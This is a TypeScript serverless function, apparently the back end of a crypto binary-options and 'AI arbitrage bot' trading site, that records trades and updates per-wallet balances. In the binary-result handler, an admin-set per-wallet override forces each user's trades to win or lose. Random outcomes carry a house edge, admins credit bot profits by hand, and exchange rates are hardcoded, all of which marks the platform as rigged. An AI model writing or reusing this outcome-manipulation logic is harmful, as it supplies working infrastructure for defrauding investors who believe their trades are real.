import { getStore } from "@netlify/blobs";
import type { Config, Context } from "@netlify/functions";
import { secureJson, sanitizeString, getClientIp, validateAdminSession, auditLog, persistAuditLog } from "../lib/security.mjs";
import { randomInt } from "crypto";

const NETWORK_LATENCY_BUFFER_MS = 3000; // tolerated timer drift for network round-trip

const DEMO_RATES: Record<string, number> = {
  USDT: 1, USDC: 1, ETH: 3200, BTC: 65000, BNB: 600, SOL: 145,
  XRP: 0.58, ADA: 0.45, AVAX: 35, DOGE: 0.15,
};

export default async (req: Request, context: Context) => {
  const store = getStore({ name: "app-data", consistency: "strong" });
  const ip = getClientIp(context);

  if (req.method === "GET") {
    const url = new URL(req.url);
    const wallet = url.searchParams.get("wallet");
    if (!wallet) {
      return secureJson({ error: "Wallet address required" }, 400);
    }
    const trades = (await store.get(`trades-${wallet.toLowerCase()}`, { type: "json" })) as any[] || [];
    return secureJson(trades, 200, true);
  }

  if (req.method === "POST") {
    let body: any;
    try {
      body = await req.json();
    } catch {
      return secureJson({ error: "Invalid JSON body" }, 400);
    }
    const { type, wallet } = body;

    if (!wallet) {
      return secureJson({ error: "Wallet address required" }, 400);
    }

    const safeWallet = sanitizeString(String(wallet), 100).toLowerCase();
    if (!safeWallet) {
      return secureJson({ error: "Invalid wallet address" }, 400);
    }

    // ── Handle binary trade result ────────────────────────────────────────────
    // Outcome is calculated server-side; the client only signals that the timer
    // has expired by sending the tradeId. Client-supplied profit is ignored.
    if (type === "binary-result") {
      const { tradeId } = body;
      if (!tradeId) {
        return secureJson({ error: "Trade ID required" }, 400);
      }

      const trades = ((await store.get(`trades-${safeWallet}`, { type: "json" })) as any[]) || [];
      const tradeIdx = trades.findIndex((t: any) => t.id === Number(tradeId));

      if (tradeIdx === -1) {
        return secureJson({ error: "Trade not found" }, 404);
      }

      const trade = trades[tradeIdx];
      if (trade.type !== "binary" || trade.status !== "active") {
        return secureJson({ error: "Trade is not an active binary trade" }, 400);
      }

      // Verify trading time has elapsed (trade.id is a Unix-ms timestamp)
      const tradeAgeMs = Date.now() - Number(trade.id);
      const requiredMs = (Number(trade.tradingTime) || 60) * 1000;
      if (tradeAgeMs < requiredMs - NETWORK_LATENCY_BUFFER_MS) {
        return secureJson({ error: "Trading time has not elapsed yet" }, 400);
      }

      // Read per-wallet outcome override set by admin; fall back to random house edge.
      // House edge: 52 out of 100 possible outcomes are losses (48% win rate).
      const control = (await store.get(`trade-control-${safeWallet}`, { type: "json" })) as { outcome: string } | null;
      const outcomeMode = control?.outcome || "random";
      const win = outcomeMode === "win" ? true : outcomeMode === "lose" ? false : randomInt(0, 100) < 48;
      const capital = Math.max(0, parseFloat(String(trade.capital)) || 0);
      const profitPct = Math.min(99, Math.max(0, parseFloat(String(trade.profitPercent)) || 85));
      const profit = win
        ? parseFloat((capital * profitPct / 100).toFixed(2))
        : -capital;

      const balance = ((await store.get(`balance-${safeWallet}`, { type: "json" })) || { usdt: 0 }) as { usdt: number };
      balance.usdt = Math.max(0, balance.usdt + profit);
      await store.setJSON(`balance-${safeWallet}`, balance);

      trades[tradeIdx].status = win ? "won" : "lost";
      trades[tradeIdx].profit = profit;
      await store.setJSON(`trades-${safeWallet}`, trades);

      await persistAuditLog("BINARY_RESULT", {
        wallet: `${safeWallet.slice(0, 8)}…`,
        tradeId,
        won: win,
        profit,
        override: outcomeMode !== "random" ? outcomeMode : undefined,
        ip,
      }, store);

      return secureJson({ success: true, won: win, profit, newBalance: balance });
    }

    // ── Complete an AI arbitrage bot (admin-only) ─────────────────────────────
    if (type === "ai-bot-complete") {
      const sessionResult = await validateAdminSession(req, store);
      if (!sessionResult.valid) {
        auditLog("AUTH_FAILURE", { operation: "ai-bot-complete", reason: sessionResult.reason, ip });
        return secureJson({ error: "Unauthorized" }, 401);
      }

      const { tradeId } = body;
      if (!tradeId) {
        return secureJson({ error: "Trade ID required" }, 400);
      }

      const trades = ((await store.get(`trades-${safeWallet}`, { type: "json" })) as any[]) || [];
      const tradeIdx = trades.findIndex((t: any) => t.id === Number(tradeId));

      if (tradeIdx === -1) {
        return secureJson({ error: "Trade not found" }, 404);
      }

      const trade = trades[tradeIdx];
      if (trade.type !== "ai-bot" || trade.status !== "active") {
        return secureJson({ error: "Trade is not an active AI bot trade" }, 400);
      }

      const capital = Math.max(0, parseFloat(String(trade.capital)) || 0);
      // Support both new (profitPercent) and legacy (dailyProfit) field names
      const profitPct = Math.min(99, Math.max(0, parseFloat(String(trade.profitPercent ?? trade.dailyProfit)) || 2.5));
      const profit = parseFloat((capital * profitPct / 100).toFixed(2));

      const balance = ((await store.get(`balance-${safeWallet}`, { type: "json" })) || { usdt: 0 }) as { usdt: number };
      balance.usdt = Math.max(0, balance.usdt + profit);
      await store.setJSON(`balance-${safeWallet}`, balance);

      trades[tradeIdx].status = "completed";
      trades[tradeIdx].profit = profit;
      await store.setJSON(`trades-${safeWallet}`, trades);

      auditLog("ADMIN_WRITE", { operation: "ai-bot-complete", wallet: `${safeWallet.slice(0, 8)}…`, profit, ip });
      return secureJson({ success: true, profit, newBalance: balance });
    }

    // ── Record a new trade ────────────────────────────────────────────────────
    const trades = ((await store.get(`trades-${safeWallet}`, { type: "json" })) as any[]) || [];
    const newTrade: Record<string, any> = {
      id: Date.now(),
      type: sanitizeString(String(type ?? ""), 32),
      status: "active",
      createdAt: new Date().toISOString(),
    };

    // Copy allowed fields (sanitized)
    const allowed = ["direction", "levelId", "levelName", "capital", "tradingTime",
      "profitPercent", "dailyProfit", "cycleTime", "duration", "fromCoin", "toCoin", "amount"];
    for (const field of allowed) {
      if (body[field] !== undefined) {
        newTrade[field] = typeof body[field] === "string"
          ? sanitizeString(body[field], 64)
          : body[field];
      }
    }

    // Swap: calculate estimated output
    if (type === "swap") {
      const fromRate = DEMO_RATES[body.fromCoin] || 1;
      const toRate = DEMO_RATES[body.toCoin] || 1;
      const feeMultiplier = 0.995; // 0.5% fee
      newTrade.estimatedOut = ((body.amount * fromRate) / toRate * feeMultiplier).toFixed(6);
      newTrade.fee = (body.amount * 0.005).toFixed(6);
    }

    trades.unshift(newTrade);
    if (trades.length > 100) trades.length = 100;
    await store.setJSON(`trades-${safeWallet}`, trades);

    return secureJson(newTrade);
  }

  return new Response("Method not allowed", { status: 405 });
};

export const config: Config = {
  path: "/api/trades",
  method: ["GET", "POST"],
};
